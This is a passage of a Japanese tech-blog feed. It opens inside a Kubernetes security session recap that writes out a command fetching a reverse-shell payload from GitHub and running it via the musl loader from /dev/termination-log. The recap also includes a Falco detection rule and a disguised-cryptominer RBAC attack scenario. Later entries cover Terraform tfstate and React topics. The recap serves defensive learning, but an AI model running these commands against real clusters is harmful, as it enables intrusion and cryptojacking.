\\"6a295899...60f05\\" > $code$ sh $dde -x < $codeケース3ケース2と同じマニフェストから作られた alpine コンテナの環境です。ファイルのダウンロードには引き続き busybox を利用しています。termination-log にファイルを保存し、リンカを利用してファイルを実行します。Kubernetes にはコンテナの終了メッセージを取得する機能があり、取得元ファイルのデフォルトパスが /dev/termination-log となっています。元々終了メッセージを書き込むことを想定したファイルなので、当然ながら書き込み可能です。これを攻撃用ファイルのダウンロード先に利用します。(終了メッセージの詳細は公式ドキュメントを参照ください)$ mount | grep termination-log/dev/vda1 on /dev/termination-log type ext4 (rw,relatime)mount コマンドの結果から、termination-log のマウントには noexec 属性がついていないことがわかります。これによりリンカを利用したファイル実行が可能となります。$ lddmusl libc (x86_64)Version 1.2.4_git20230717Dynamic Program LoaderUsage: /lib/ld-musl-x86_64.so.1 [options] [--] pathnameldd コマンドにより、リンカの使い方は /lib/ld-musl-x86_64.so.1 [実行ファイルのパス] であることがわかりました。あとは攻撃用ファイルをダウンロードして実行するだけです。$ busybox wget -O - https://raw.githubusercontent.com/arget13/DDexec/main/c-shell > /dev/termination-log$ /lib/ld-musl-x86_64.so.1 /dev/termination-logケース1, 2と同様、実行後にはリバースシェルが確立されています。攻撃テクニックの説明は以上となります。seccomp や SELinux の活用termination-log の場所の指定コンテナ内の通信やプロセスの監視seccomp や SELinux は対策としては一般的ですが、termination-log については聞いたことがなく、興味深い内容でした。ただしログの場所を変更できても noexec を付与する方法は見つけられなかったので、有効な対策と言えるかどうかはやや疑問が残りました。ケース2の /dev/shm を利用した攻撃については、検知するための Falco ルールも例示されました。- rule: Execution from /dev/shm  desc: This rule detects file execution from the /dev/shm directory,    a common tactic for threat actors to stash their readable+writable+(sometimes)executable files.  condition: >    spawned_process and    (proc.exe startswith \\"/dev/shm/\\" or    (proc.cwd startswith \\"/dev/shm/\\" and proc.exe startswith \\"./\\" ) or    (shell_procs and proc.args startswith \\"-c /dev/shm\\") or    (shell_procs and proc.args startswith \\"-i /dev/shm\\") or    (shell_procs and proc.args startswith \\"/dev/shm\\") or    (proc.args contains \\"/dev/shm\\" or proc.cwd startswith \\"/dev/shm\\") or    (proc.cwd startswith \\"/dev/shm/\\" and proc.args startswith \\"./\\" ))    and not container.image.repository in (falco_privileged_images, trusted_images)  output: \\"File execution detected from /dev/shm    (proc.cmdline=%proc.cmdline connection=%fd.name user.name=%user.name user.loginuid=%user.loginuid    container.id=%container.id evt.type=%evt.type evt.res=%evt.res proc.pid=%proc.pid proc.cwd=%proc.cwd proc.ppid=%proc.ppid    proc.pcmdline=%proc.pcmdline proc.sid=%proc.sid proc.exepath=%proc.exepath user.uid=%user.uid    user.loginname=%user.loginname group.gid=%group.gid group.name=%group.name container.name=%container.name image=%container.image.repository)\\"  priority: WARNING本セッションは発表者が6月に投稿した記事をもとにしているようなので、併せて読んでいただくと良いかもしれません。また資料中の Pod のマニフェストはそのまま apply するとエラーになるため、ご自身で環境を再現したい方は以下をご利用ください。ケース1:apiVersion: v1kind: Podmetadata:  name: method1-podspec:  containers:  - name: nginx    image: nginx:latest    securityContext:      readOnlyRootFilesystem: true      runAsUser: 101    ports:    - containerPort: 80    volumeMounts:    - mountPath: /var/run      name: run    - mountPath: /var/cache/nginx      name: nginx-cache  securityContext:    seccompProfile:      type: RuntimeDefault  volumes:  - name: run    emptyDir: {}  - name: nginx-cache    emptyDir: {}ケース2, 3:apiVersion: v1kind: Podmetadata:  name: method2-podspec:  containers:  - name: alpine    image: alpine    command:      - sleep    args:      - \\"3600\\"    securityContext:      readOnlyRootFilesystem: true      runAsUser: 65534  securityContext:    seccompProfile:      type: RuntimeDefaultRBACdoors: How Cryptominers Are Exploiting RBAC Misconfigsセッション情報system:anonymous ユーザーに cluster-admin ロールを付与していた場合の攻撃事例を紹介しています。cluster-admin は事前定義された ClusterRole で、クラスタ内のすべてのリソースに対する権限を持っています。system:anonymous は匿名リクエストに対して割り当てられているユーザーです。Kubernetes クラスタに対して認証なしであらゆるリソース操作ができてしまいます。今回の攻撃シナリオは以下の通りです。Kubernetes API Server をスキャンし、設定ミスのあるクラスタを発見DaemonSet としてクリプトマイナー (XMRig) を設置cluster-admin の証明書を作成し、クラスタへの侵害を永続化証明書作成の痕跡を削除興味深い点として、クリプトマイナーを設置する際に ClusterRoleBinding と DaemonSet を作成しますが、リソース名を kube-controller とすることで正規のリソースを偽装しています。運用業務でクラスタ内のリソースを確認したとしても、クリプトマイナーの存在に気づかないかもしれません。リポジトリも kubernetesio/~ のように偽装しています。また今回はCSRを削除していますが、cluster-admin を持っていれば、クラスタ内で行われる検知の回避や防御の無効化も容易にできてしまいます。クラスタとは別のレイヤーで、監査ログの監視などを行う必要があるかもしれません。パブリッククラウドを利用する場合、クラスタ内のセキュリティ対策とクラウド上の監視サービスを併用するのが良さそうです。セッション後半では、取るべきセキュリティ対策について紹介しています。Kubernetes API Server へのアクセスのネットワーク制限--anonymous-auth=false による匿名リクエストを無効化アドミッションコントローラーによる cluster-admin のバインディング禁止検知策として、設定ミスの検知Kubernetes API への攻撃の検知マイニングの検知のそれぞれ3つの対策が挙げられています。設定ミスの対策では、system:anonymous や system:authenticated に付与された権限がないか確認するためのスクリプトが紹介されています。Kubernetes の監査ログを監視することも有効です。Google Cloud の Security Command Center (SCC) には脅威検知の機能がありますが、この機能を利用すれば GKE に対する設定ミスや攻撃を検知できます。(発表者は Google Cloud の方です)マイニングの検知について、IoC (Indicator of Compromise) を利用する方法がセッション内では紹介されています。既知のマルウェアコンテナや悪意のあるバイナリ、攻撃サーバのIPアドレス等と照合することで攻撃を検知します。SCC におけるマイニング検知のベストプラクティスも興味があれば読んでみてください。おわりにいかがだったでしょうか？Kubernetes への攻撃手法を知ることは、(それ自体面白いというのもありますが) リスクベースのセキュリティ対策を検討する上で非常に有用です。このセキュリティ対策はどのような攻撃リスクを軽減してくれるのかこの攻撃が行われた場合、どのセキュリティ対策によって防ぐことができるのかといった観点で考えてみることをお勧めします。Kubernetes クラスタを目指して、皆で取り組んでいきましょう。","isoDate":"2023-12-30T19:07:20.000Z","dateMiliSeconds":1703963240000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"フォームライブラリに依存しないReactコンポーネント設計","link":"https://zenn.dev/kimitsu/articles/clean-react-form-architecture","contentSnippet":"背景React ではフォームライブラリを利用する場合、ナイーブに実装するとフォームの UI とフォームライブラリが密結合になります。これは特定のフォームライブラリに限った話ではなく、React Hook Form, Formik, React Final Form といった主要なフォームライブラリ全てで当てはまる問題です。例えば React Hook Form では、フォーム全体の設定をuseFormで行い、各属性ではregister, Controller, useControllerを使って UI と React Hook Form を接続します。つまりフォームコンポーネ...","isoDate":"2023-12-30T06:07:24.000Z","dateMiliSeconds":1703916444000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Step Functionsを利用してNAT Gatewayを自動作成/削除する","link":"https://qiita.com/ys1/items/abf8daab19f616b3d854","contentSnippet":"概要本記事ではStep Functionsを利用して、Nat Gatewayを自動で作成/削除する方法について記載します。NAT Gatewayは作成しているだけでコストがかかるリソースであり、開発環境の利用していない時間帯などは停止(削除)することでコスト削減につな...","isoDate":"2023-12-29T15:25:41.000Z","dateMiliSeconds":1703863541000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"パフォーマンスを気にするならReact Hook Formが無難","link":"https://zenn.dev/kimitsu/articles/react-form-library-performance","contentSnippet":"最近、React のフォームライブラリを調査しました。その中でパフォーマンスについての言及は見かけるものの、実際に計測しているものが見当たらなかったので計測してみました。結論としては React Hook Form でなくても良いけど、パフォーマンスを気にするなら React Hook Form を選んでおくのが無難というところに落ち着きました。 要約入力欄 10 個、CPU 6\xd7 slowdown での計測結果ライブラリ1 文字入力した場合の再描画React Hook Form8ms 前後Formik100ms 前後Formik（<F...","isoDate":"2023-12-29T14:00:56.000Z","dateMiliSeconds":1703858456000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"K8sGPT: Log Analyzer","link":"https://zenn.dev/tozastation/articles/3e2b9e887639f4","contentSnippet":"Filter 一覧➜  k8sgpt filters listActive:> ReplicaSet> PersistentVolumeClaim> Service> StatefulSet> Node> Pod> Deployment> Ingress> CronJob> ValidatingWebhookConfiguration> MutatingWebhookConfigurationUnused:> HTTPRoute> HorizontalPodAutoScaler...","isoDate":"2023-12-28T08:26:54.000Z","dateMiliSeconds":1703752014000,"authorName":"tozastation","authorId":"tozastation"},{"title":"K8sGPT: 概要","link":"https://zenn.dev/tozastation/articles/737871319fb33b","contentSnippet":"K8sGPT とはIt has SRE experience codified into its analyzers and helps to pull out the most relevant information to enrich it with AI.README.md, k8sgpt, https://github.com/k8sgpt-ai/k8sgptREADME.md の引用ですが、SRE Experience が Analyzerに体系化されており、最も関連性の高い情報を引き出してAIで補完するのに役立つと書かれています。 SRE Experien...","isoDate":"2023-12-28T07:16:37.000Z","dateMiliSeconds":1703747797000,"authorName":"tozastation","authorId":"tozastation"},{"title":"Kubernetesのソースコードを読む Kubelet編","link":"https://qiita.com/ys1/items/7a455c602424e591fe38","contentSnippet":"起動処理Kubeletの起動処理についてソースコードを追っていき、どんな処理をしているのかみていきたいと思います。読むソースコード: バージョン: v1.27.2まず、Kubeletの起動処理について追っていきたいと思います。appパッケージのKubele...","isoDate":"2023-12-25T15:06:41.000Z","dateMiliSeconds":1703516801000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Terraformのtfstateについて考える","link":"https://blog.masasuzu.net/entry/2023/12/23/000000","contentSnippet":"この記事は3-shake Advent Calendar 2023の23日目の記事となります。3-shakeのカレンダー | Advent Calendar 2023 - QiitaこちらはSRE Tech Talk #6で話した内容に補足したものです。3-shake SRE Tech Talk #6 - connpass資料はこちらとなります。    tfstateとはtfstateの課題tfstateの管理場所をどうするか問題localS3/Google Cloud StorageGitLabTerraform Cloudtfstateを管理するリソースをどう管理する問題aws/gcloud コマンドterraform + local state 管理CloudFormation / Google Deployment Managertfstateをどう分割するか問題環境分離パターンディレクトリ分離パターンbackend-configパターンworkspace環境分離以外の分割をどうするか問題分割する観点プロバイダーで分割管理権限で分割変更頻度で分割依存の方向性で分割tfstate間のリソース参照まとめtfstateとはTerraformが管理しているリソースの状態を表すjson形式のファイルです。tfstateとterraformファイルと実際のリソースの状態を比較して、terraformコマンドが実行されます。一般的には直接変更せずterraform stateコマンドを通して変更を行い、一般ユーザがtfstateに触れることはないです。参考: Backend Configuration - Configuration Language | Terraform | HashiCorp Developertfstateの課題tfstateについて以下の課題があります。それぞれについて見ていきます。tfstateの管理場所tfstateを管理するリソースの管理tfstateの分割tfstateの管理場所をどうするか問題主な保存場所候補としては以下のものがあります。local(デフォルト)クラウドのオブジェクトストレージS3/Google Cloud StorageGitレポジトリ統合GitLabSaaS利用Terraform CloudlocalTerraformのデフォルト保存先です。Terraformを実行する同じディレクトリのterraform.tfstateに保存されます。1人もしくは変更頻度が著しく低い状況など特殊なとき使えるものとなります。git管理して複数人で使うこともできるが、コンフリクトが発生しうるので、チーム開発には向かないです。基本的には複数人でterraformを使用するときは非推奨です。参考: Backend Type: local | Terraform | HashiCorp DeveloperS3/Google Cloud Storage監理するクラウドのオブジェクトストレージに保存する方法です。これが標準的(当社比)なのかなと思っています。オブジェクトストレージなので、権限があればどこからでもアクセスすることができます。それゆえ、同時にTerraformが実行されるので排他ロックの処理が必要となります。S3バックエンドを使用した場合はDynamoDBを使用してstate lockを実現します。Google Cloud Storageは単体でstate lockをサポートしています。tfstateの参照権限をクラウドのIAMで制御する必要があります。参考: Backend Type: s3 | Terraform | HashiCorp Developer参考: Backend Type: gcs | Terraform | HashiCorp DeveloperGitLabGitLabでtfstateを監理することもできます。tfstateを管理するリソースを管理する必要がないことがメリットとなります。(後述します)開発にGitLabを使っている場合、親和性が高い方法となります。参考: GitLab-managed Terraform state | GitLabTerraform CloudGitLabと同様tfstateを管理するリソースを管理する必要がないというところにメリットがあります。月間500 Managed Rsourcesまで無料で使えます。参考: HashiCorp Terraform: Enterprise Pricing, Packages & Featuresweb上からリソース差分の確認できたり、applyが可能です。SaaSにクラウドのリソース情報を預けることに抵抗がない場合は選択肢としては有望です。なおTerraformのStateのドキュメントではこういう記述があり、Terraform Cloudを推奨しているようです。This state is stored by default in a local file named \\"terraform.tfstate\\", but we recommend storing it in Terraform Cloud to version, encrypt, and securely share it with your team.参考: State | Terraform | HashiCorp Developer昔はAWSと連携するためにIAM Userのアクセスキーを使わないといけなかったが、OIDC認証もできるようになったので、よりやりやすくなったかと思います。参考: Terraform Cloud Adds Dynamic Provider Credentials for Vault and Official Cloud Providers参考: Terraform Cloud | Terraform | HashiCorp Developertfstateを管理するリソースをどう管理する問題GitLabやTerraform Cloudを使う場合には起きない問題となります。S3のようなクラウドのオブジェクトストレージを使用する場合は、このS3バケットをどう作るかということが問題となります。コマンドで作る場合、コマンドの管理、terraformで作る場合はそのtfstateはどこに保存するか、そういったことに頭を悩ませます。そこについて考えていきます。以下の方法が考えられます。aws/gcloudコマンドterraform + local state管理CloudFormationaws/gcloud コマンドそもそも作成コマンドしか打たないのであれば、スクリプトをレポジトリに含めておけば良いという考え方はあります。基本的に一度作れば変えることはないので、これで十分という風に割り切ることはできます。ただし、tfstateのバケットだけでなく、CI/CD用のIAM RoleやOIDC認証リソースなども初期リソースとして含めて管理したいというユースケースだと、スクリプト管理では力不足になりうります。terraform + local state 管理オブジェクトストレージをterraformで作る方法です。ただし、tfstateに関してはlocalに保存し、これをgitも管理します。かたくなにterraformを使いたい人に向けな方法となります。デメリットとしては、tfstateもgit管理するのでコミット忘れがあります。また、頻度低いですがterraform自体はローカルで実行せざるを得ないので変更衝突が起きうることです。CloudFormation / Google Deployment Managerクラウドごとにコードを変えないといけない。IaCツールを2種類使うというそこはかとない気持ち悪さはあるというデメリットはありますが、gitでインフラ状態管理しなくてすむというメリットがあります。気持ち悪さだけを克服できるなら無難な選択肢だとは思います。tfstateをどう分割するか問題第一に考えるのが環境の分離。この分離の仕方だけ他とは系統が違うので独立して説明します。一部差分があるだけで、以下のような形でほぼ同じ構成の環境を作ることはよくあります。開発環境ステージング環境本番環境これらについてどう分割するのかを考えていきます。環境分離パターン大きく2つのパターンを利用することが多いです。それぞれ見ていきます。ディレクトリ分離パターンbackend-configパターンディレクトリ分離パターンこれは環境ごとにディレクトリを分割して、環境ディレクトリを実行単位とします。環境の切り替えはディレクトリ移動することで行います。環境ごとの差分が大きいときに使うことが多いです。デメリットとしては環境ごとにリソース定義をそれぞれ書くので記述量が多くなるというのがあります。そのため、可能な限りモジュール化して、なるべくパラメータだけの差分にするようにします。ディレクトリ構成例としては以下の通りです。.├── envs│   ├── dev│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   ├── prd│   │   ├── locals.tf│   │   ├── main.tf│   │   ├── outputs.tf│   │   └── variables.tf│   └── stg│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf└── modules    ├── vpc    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tf    ├── application    │   ├── locals.tf    │   ├── main.tf    │   ├── outputs.tf    │   └── variables.tfbackend-configパターンbackend-configオプションとvars-fileオプションを組み合わせて、環境を切り替えるパターンです。${ENVDIR}/terraform.tfvars に環境ごとの差分パラメータを定義して、${ENVDIR}/backend.tfvars に環境ごとのtfstate保存先を定義します。terraform init で backend.tfvars を切り替えることで環境の切り替えを行います。環境ごとに差分が少ないときに向いています。差分は terraform.tfvars に記述されているパラメータだけなので、記述量が少なくて済みます。ただし差分が多くなるとcount, for_eachで分岐やループを作ることになり読みにくくなるというものがあります。ディレクトリ構成例としては以下のようになります。.├── envs│   ├── dev│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   ├── prd│   │   ├── backend.tfvars│   │   └── terraform.tfvars│   └── stg│       ├── backend.tfvars│       └── terraform.tfvars├── locals.tf├── main.tf├── modules│   └── vpc│       ├── locals.tf│       ├── main.tf│       ├── outputs.tf│       └── variables.tf├── outputs.tf├── provider.tf└── variables.tf設定ではbackendをs3と指定しておき中身はオプションで指定するようにします。terraform {  backend \\"s3\\" {}}以下のようにterraform initするたびに適用する環境を切り替えることができる。terraform init --backend-config=${ENVDIR}/backend.tfvars --reconfigureterraform apply --var-file=${ENVDIR}/terraform.tfvarsworkspaceworkspaceは同じような環境を複製するときに使ういます。シングルテナント環境を量産する場合や開発環境を複数作る場合などに使います。環境を切り替える用途には作られてないとドキュメントまでは記載されています。参考: Managing Workspaces - Terraform CLI | Terraform | HashiCorp DeveloperIn particular, organizations commonly want to create a strong separation between multiple deployments of the same infrastructure serving different development stages or different internal teams. In this case, the backend for each deployment often has different credentials and access controls. CLI workspaces within a working directory use the same backend, so they are not a suitable isolation mechanism for this scenario.自分自身がworkspaceを実運用で使ったことがないので多くは語れないです。別でちゃんと使ってから書きたいと思います。参考: State: Workspaces | Terraform | HashiCorp Developer環境分離以外の分割をどうするか問題小さいサービスでは環境を分離するだけでだいたいは問題ないことがおおいですが、terraformを運用していると運用面、管理面でいろいろ課題が出てくると思います。管理するリソースが増えるとplan/applyの時間が増えたり、リソースの見通しが悪くなったりしてきます。特に実行時間が意外に馬鹿にできなかったりします。下手するとplanに数分かかるようになったりします。そのため、ある程度大きくなったらtrstateを分割して、リソースの管理範囲を分割する必要が出てきます。これをどうやって分割するかが自分の中で答えが出ていない出てないし、分脈によって解決策は異なるとは思います。ここで、解決策を考えるうえで、分割するための観点を見ていきましょう。分割する観点分割する観点は以下のようなものがあるかと思います。プロバイダー管理権限変更頻度プロバイダーで分割プロバイダー単位で分割するパターンです。例としてはAWSとDatadogのようにプロバイダーで分割します。プロバイダー間で依存がない場合は分けやすいかと思います。また、プロバイダー間で管理主体が違うことも多いので素直な分け方だとは思います。しかしながら、アプリケーションリソースとアプリケーションの監視を近いところにおいたほうが見通しがよいのではという観点もあるので運用体制にあわせて考えるとよいでしょう。管理権限で分割チームの権限で分割するパターンです。ただし、より堅くするなら、ディレクトリではなくレポジトリ自体も分割して、コードの参照権限も分割する方が望ましい場合もあります。例ネットワーク ⇒ インフラチームアプリケーション ⇒ 開発チーム変更頻度で分割変更をあまりしないリソースを変更が頻繁なリソースと一緒のplan/applyするのは無駄なので変更の頻度でtfstateを分割するパターンもあります。例変更が少ない ⇒ DB/ネットワーク変更が多い ⇒ EC2/ECS依存の方向性で分割少し観点を変えてみます。実際に分割をした場合に問題となるのはtfstate間のリソースの依存が課題になります。tfstate間で相互に依存するようなコードを書くとtarget指定してそれぞれのstateのリソースを作成しなくてはなりません。こうすると管理が煩雑となってしまうので、原則的に片方向だけの依存になるように分割するようにするのが望ましいです。tfstate間のリソース参照terraform_remote_state を使うことで、参照元のTerraformでoutputした内容を別のTerraformで利用することができます。# 参照元 networkアカウントoutput \\"vpc_id\\" {  value = aws_vpc.main.id}# 参照先 applicationアカウント# data.terraform_remote_state.network.vpc_id の形式でVPC IDを参照できるdata \\"terraform_remote_state\\" \\"network\\" {  backend = \\"s3\\"  config {    bucket = \\"terraform-tfstate-network-xxxxx\\"    key    = \\"tfstate\\"    region = \\"ap-northeast-1\\"  }}まとめ正直tfstateをどう扱うかに正解はないです。サービス規模や性質によって選択は変わります。本当に小さい規模であれば、tfstateを分割せず一つで十分でしょうし、チーム開発せず一人で扱うなら、通常であれば推奨されないtfstateのlocal git管理という手段がふさわしい場合もあります。また、組織やサービスの成長や時間経過によっても最適な選択は変わると思います。大事なのは選んだ技術要素に関しては選定理由を説明できるようにはしておくということです。選定理由及び不採用理由を明確にしておくことで、変更時に最適な選択の助けになるでしょう。","isoDate":"2023-12-22T15:00:00.000Z","dateMiliSeconds":1703257200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"testcontainers-scala で快適なインテグレーションテストを実現する","link":"https://zenn.dev/nomadblacky/articles/173ea1f829eafa","contentSnippet":"この記事は、3-shake Advent Calendar 2023 の 22 日目の記事です。 はじめに私の所属する株式会社スリーシェイクでは、Reckoner というデータパイプライン構築の SaaS を開発しています。https://reckoner.io/「SaaSをつなぐ。業務が変わる。ビジネスが進化する。」直感的なユーザーインターフェイスで、多種多様な SaaS のデータをつなぎ合わせることで、データ活用・データの民主化を実現します。 課題Reckoner では、データの取得・加工・保存部分を Scala で実装しており、データの連携先として、MySQL ...","isoDate":"2023-12-22T13:07:06.000Z","dateMiliSeconds":1703250426000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"AWS Network Firewall と NAT ゲートウェイの配置","link":"https://zenn.dev/toshikish/articles/d7d15cd01a8584","contentSnippet":"はじめにAWS Network Firewall（以下 NWFW）の導入例を探してアーキテクチャ図を眺めていると，説明されている図によって NAT ゲートウェイ（以下 NATGW）との配置がまちまちであることに気づきます。つまり，プライベート・パブリックサブネットのシンプルな構成の場合，インターネット宛ての通信経路は大別するとプライベートサブネット→ NATGW→ NWFW →インターネットプライベートサブネット→ NWFW → NATGW →インターネットの2種類が存在します。それぞれのアーキテクチャの違いと，どちらを選定すべきかの指針についてまとめます。 1....","isoDate":"2023-12-22T07:17:39.000Z","dateMiliSeconds":1703229459000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Kubernetesに対する理解を高めてKubernetesの「わからない」を減らそう","link":"https://speakerdeck.com/bells17/kubernetesnidui-suruli-jie-wogao-metekubernetesno-wakaranai-wojian-rasou","contentSnippet":"Kubernetes Novice Tokyo #29 で発表したLT資料です\\r\\rイベントURL: https://k8s-novice-jp.connpass.com/event/300438/\\r動画URL: https://www.youtube.com/watch?v=WZHDlB8P9_4\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.4 \\rhttps://github.com/coredns/coredns/tree/v1.11.1 \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin/kubernetes/README.md \\rhttps://github.com/kubernetes/dns/blob/1.22.28/docs/specification.md \\rhttps://github.com/kubernetes/cri-api/blob/v0.28.4/pkg/apis/runtime/v1/api.proto \\rhttps://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/\\rhttps://coredns.io/2016/12/19/writing-plugins-for-coredns/ \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin.md  \\r\\rセッション内容の詳しい資料:\\rhttps://bells17.booth.pm/items/3129761\\rhttps://bells17.booth.pm/items/2649601\\rhttps://speakerdeck.com/bells17/implementation-of-kubeadm-init\\rhttps://speakerdeck.com/bells17/kube-api-server-k8sjp\\rhttps://speakerdeck.com/bells17/kube-controller-managerru-men\\rhttps://speakerdeck.com/bells17/kube-proxyru-men\\rhttps://speakerdeck.com/bells17/kubernetestocorednsnituiteli-jie-suru\\rhttps://speakerdeck.com/bells17/cloud-controller-manager-deep-dive\\rhttps://speakerdeck.com/bells17/introduction-to-csi\\rhttps://speakerdeck.com/bells17/kubelet-and-containers\\rhttps://speakerdeck.com/bells17/cri-spec-and-dockershim-implementation","isoDate":"2023-12-21T05:00:00.000Z","dateMiliSeconds":1703134800000,"authorName":"bells17","authorId":"bells17"},{"title":"\uD83D\uDC19 KubernetesのマルチテナントパターンとArgoCDの実践テナント設計","link":"https://speakerdeck.com/hiroki_hasegawa/kubernetesnomarutitenantopatantoargocdnoshi-jian-tenantoshe-ji","contentSnippet":"『Kubernetes Novice Tokyo』の登壇資料です\\r\\r・Kubernetesのマルチテナントパターンの種類\\r・ArgoCDのAppProjectテナントとNamespacedスコープモード\\r・ArgoCDのテナントが防いでくれる誤った操作の具体例\\r\\rを紹介しました\\r\\rArgoCDのマニフェストの実装例を解説できませんでしたので、ぜひ元記事 (KubernetesのマルチテナントパターンとArgoCDの実践テナント設計) もご参照ください\uD83D\uDC4D\uD83C\uDFFB\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1737778249021952458","isoDate":"2023-12-21T05:00:00.000Z","dateMiliSeconds":1703134800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"【ArgoCD\uD83D\uDC19】\\"Kubernetes Novice Tokyo\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/12/21/833414","contentSnippet":"発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Kubernetesのマルチテナントパターンの種類ArgoCDのAppProjectテナントとNamespacedスコープモードArgoCDのテナントが防いでくれる誤った操作の具体例発表スライドから得られる知識イベント名発表スライドイベント名オッス！オラ長谷川！✋\uD83C\uDFFB『KubernetesのマルチテナントパターンとArgoCDの実践テナント設計』ていうテーマで、 Kubernetes Novice Tokyo に登壇したぞ！https://k8s-novice-jp.connpass.com/event/300438/発表スライドみんな！スライドぜってぇ見てくれよな！Kubernetes Novice Tokyo の登壇資料です！キミだけの最強のマルチテナントを作ろう✌️#k8snovicehttps://t.co/qNEhnkA7WZ— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) December 21, 2023 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2023-12-21T03:00:00.000Z","dateMiliSeconds":1703127600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"テーブル構造変更に伴う認可・権限管理を設計実装してみて思ったこと","link":"https://qiita.com/bayobayo0324/items/a2fcc5eee9930bd2009a","contentSnippet":"※この記事は3-shake Advent Calendar 2023の20日目の記事ですはじめまして、@bayobayo0324 です。株式会社スリーシェイクでクラウド型データ連携ツール「Reckoner（レコナー）」のプロダクトエンジニアしています。去年も書いていた...","isoDate":"2023-12-19T22:00:39.000Z","dateMiliSeconds":1703023239000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"terraform test: 細かい挙動","link":"https://zenn.dev/kyohei_saito/articles/eac62818b7217d","contentSnippet":"この記事は 3-shake Advent Calendar 2023 19 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能terraform test: 細かい挙動 <- 今ここ はじめに前回の記事では、 terraform test の応用的な機能の紹介をしました。この記事では、 terraform test の挙動について説明します。 terraform test: 細かい挙動 state...","isoDate":"2023-12-18T14:58:00.000Z","dateMiliSeconds":1702911480000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"KubernetesとCoreDNSについて理解する","link":"https://speakerdeck.com/bells17/kubernetestocorednsnituiteli-jie-suru","contentSnippet":"3-shake SRE Tech Talk #8 で発表したLT資料です\\r\\rイベントURL: https://3-shake.connpass.com/event/302755/\\r動画URL: https://www.youtube.com/watch?v=8JbfniqxNQk\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.4 \\rhttps://github.com/coredns/coredns/tree/v1.11.1 \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin/kubernetes/README.md \\rhttps://github.com/kubernetes/dns/blob/1.22.28/docs/specification.md \\rhttps://github.com/kubernetes/cri-api/blob/v0.28.4/pkg/apis/runtime/v1/api.proto \\rhttps://coredns.io/2017/03/01/how-to-add-plugins-to-coredns/\\rhttps://coredns.io/2016/12/19/writing-plugins-for-coredns/ \\rhttps://github.com/coredns/example \\rhttps://github.com/coredns/coredns/blob/v1.11.1/plugin.md","isoDate":"2023-12-18T05:00:00.000Z","dateMiliSeconds":1702875600000,"authorName":"bells17","authorId":"bells17"},{"title":"2023-12-18 SRETT8 Terraform使いがPulumiに入門する","link":"https://speakerdeck.com/masasuzu/2023-12-18-srett8-terraformshi-ikapuluminiru-men-suru","contentSnippet":"","isoDate":"2023-12-18T05:00:00.000Z","dateMiliSeconds":1702875600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"terraform test: 応用機能","link":"https://zenn.dev/kyohei_saito/articles/52ce184522aae9","contentSnippet":"この記事は 3-shake Advent Calendar 2023 18 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能terraform test: 応用機能 <- 今ここterraform test: 細かい挙動 はじめに前回の記事では、 terraform test の基本的な機能の紹介をしました。前回の記事の内容でも十分に terraform module のテストを書くことができると思います。しかし、今回紹介する応用的な機能を使...","isoDate":"2023-12-17T14:58:00.000Z","dateMiliSeconds":1702825080000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"AWS Step Functionsを利用してAWSリソースの自動起動停止を行う","link":"https://qiita.com/ys1/items/21744f39676286b2c321","contentSnippet":"概要本記事ではStep Functionsを利用して、AWSリソースを自動で起動停止する方法について記載します。主にコスト削減のために、開発環境を夜間停止するなどで利用することを想定しています。今回は以下のようなことを実施する方法について説明しますStep Fu...","isoDate":"2023-12-17T14:55:57.000Z","dateMiliSeconds":1702824957000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"個人開発で要件定義、設計をした話","link":"https://kechigon.hatenablog.com/entry/2023/12/17/142140","contentSnippet":"現在、個人開発で麻雀戦績管理アプリを作っていて、要件定義や設計について考えたことを共有したいと思います。GitHub ↓github.comなぜやったのか自分はWebエンジニアを目指している大学生ですが、まともなWebアプリを開発した経験がなく、フロントからインフラまでフルスタックで開発しようと思い立ちました。最初は何をするか手探りの状態でしたが、その「何をするのか」を定義するために要件定義、設計から始めました。何をやったのかGitHubにissueを作成し、やるべきことを明確化していきました。要件定義ここではアプリケーションの機能や、なぜそのような機能にするのかを箇条書きしていきます。この作業を通してやることとやらないことが明確化され、実装もうっすら浮かんできます。実際の要件定義は以下のような感じになりました。- ユーザーはまずサインアップする   - ユーザー名、パスワードを設定する      - ユーザー名は一意でないといけない   - ユーザの削除機能はデータ整合性が複雑になるので作らない - サインアップ済みのユーザーはログインをする   - ユーザー名、パスワードを入力- セッション管理をし、セッションが張られていたらログインを省略し、ユーザーホーム画面に入る。- 